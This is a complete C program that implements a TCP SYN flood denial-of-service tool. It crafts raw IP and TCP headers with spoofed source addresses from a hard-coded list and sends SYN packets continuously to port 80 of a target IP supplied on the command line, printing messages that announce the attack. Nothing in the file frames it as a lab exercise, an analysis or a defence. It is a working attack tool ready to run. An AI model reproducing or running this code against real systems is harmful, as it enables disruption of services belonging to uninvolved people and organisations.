#define _DEFAULT_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

#define PACKET_SIZE 4096
#define MAX_SPOOFED_IPS 4

volatile int keep_running = 1;

void sig_handler(int sig) {
    if (sig == SIGINT) {
        keep_running = 0;
    }
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return(answer);
}

// Calculate TCP checksum
unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph, char *payload, int payload_len) {
    char buf[PACKET_SIZE];
    char *ptr;
    int chksum_len;
    
    ptr = &buf[0];
    
    // Copy source IP
    memcpy(ptr, &iph->saddr, sizeof(iph->saddr));
    ptr += sizeof(iph->saddr);
    
    // Copy destination IP
    memcpy(ptr, &iph->daddr, sizeof(iph->daddr));
    ptr += sizeof(iph->daddr);
    
    // Copy zeroes
    *ptr = 0; ptr++;
    
    // Copy protocol
    *ptr = IPPROTO_TCP; ptr++;
    
    // Copy TCP length
    unsigned short tcp_len = htons(sizeof(struct tcphdr) + payload_len);
    memcpy(ptr, &tcp_len, sizeof(tcp_len));
    ptr += sizeof(tcp_len);
    
    // Copy TCP header
    memcpy(ptr, tcph, sizeof(struct tcphdr));
    ptr += sizeof(struct tcphdr);
    
    // Copy payload
    if (payload_len > 0) {
        memcpy(ptr, payload, payload_len);
        ptr += payload_len;
    }
    
    chksum_len = (ptr - &buf[0]);
    
    return checksum((unsigned short *) buf, chksum_len);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <target_ip>\n", argv[0]);
        return -1;
    }

    // Register signal handler for graceful termination
    signal(SIGINT, sig_handler);

    int sockfd;
    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));
    struct sockaddr_in dest;
    
    // Spoofed IPs (agent devices)
    char *spoofed_ips[MAX_SPOOFED_IPS] = {"10.0.0.3", "10.0.0.4", "10.0.0.5", "10.0.0.6"};
    
    // Zero out the packet buffer
    memset(packet, 0, PACKET_SIZE);
    
    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Failed to create raw socket");
        printf("Note: Root privileges are required to create raw sockets.\n");
        exit(EXIT_FAILURE);
    }
    
    // Tell kernel not to generate IP headers
    int one = 1;
    const int *val = &one;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    // Set destination
    dest.sin_family = AF_INET;
    dest.sin_port = htons(80); // Target port
    if (inet_aton(argv[1], &dest.sin_addr) == 0) {
        fprintf(stderr, "Invalid target IP address\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    printf("Starting TCP SYN flood attack on %s\n", argv[1]);
    printf("Press Ctrl+C to stop...\n");
    
    srand(time(NULL)); // Seed random number generator
    
    // Send continuous SYN packets with spoofed IPs
    while(keep_running) {
        for(int i = 0; i < MAX_SPOOFED_IPS && keep_running; i++) {
            // Zero out the packet buffer for each iteration
            memset(packet, 0, PACKET_SIZE);
            
            // Fill IP header
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            iph->id = htons(rand() % 65535);
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            if (inet_aton(spoofed_ips[i], (struct in_addr *)&iph->saddr) == 0) {
                fprintf(stderr, "Invalid spoofed IP address: %s\n", spoofed_ips[i]);
                continue;
            }
            iph->daddr = dest.sin_addr.s_addr;
            
            // IP checksum
            iph->check = checksum((unsigned short *) packet, sizeof(struct iphdr));
            
            // Fill TCP header
            tcph->source = htons(rand() % 65535 + 1024); // Random source port
            tcph->dest = htons(80); // Target port
            tcph->seq = htonl(rand() % 4294967295); // Random sequence number
            tcph->ack_seq = 0;
            tcph->doff = 5;
            tcph->fin = 0;
            tcph->syn = 1; // SYN flag set
            tcph->rst = 0;
            tcph->psh = 0;
            tcph->ack = 0;
            tcph->urg = 0;
            tcph->window = htons(5840);
            tcph->check = 0;
            tcph->urg_ptr = 0;
            
            // Calculate TCP checksum
            tcph->check = tcp_checksum(iph, tcph, NULL, 0);
            
            // Send the packet
            if (sendto(sockfd, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
                perror("Failed to send packet");
            } else {
                printf("Sent SYN packet from %s\n", spoofed_ips[i]);
            }
            
            // Small delay to control flood rate
            usleep(1000);
        }
    }
    
    printf("\nStopping SYN flood attack...\n");
    close(sockfd);
    return 0;
}